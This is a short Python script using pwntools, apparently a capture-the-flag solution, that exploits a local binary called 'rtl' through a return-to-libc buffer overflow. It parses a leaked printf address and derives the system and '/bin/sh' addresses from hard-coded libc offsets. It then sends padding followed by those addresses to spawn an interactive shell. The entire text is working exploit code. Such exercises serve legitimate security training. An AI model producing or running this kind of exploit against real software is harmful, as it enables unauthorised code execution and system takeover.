from pwn import *

r = process('rtl')
r.recvline() # ignore buf addr.
addr = r.recv()[:-1]
addr = addr.decode('utf-8')
printf = int(addr, 16)

print (hex(printf))

system = printf - int('0xf850', 16)
binsh  = printf + int('0x161bb5', 16)

ex  = b'a'*40
ex += b'b'*8
ex += p32(system)
ex += b'a'*4
ex += p32(binsh) 

r.send(ex)
r.interactive()

print (ex)
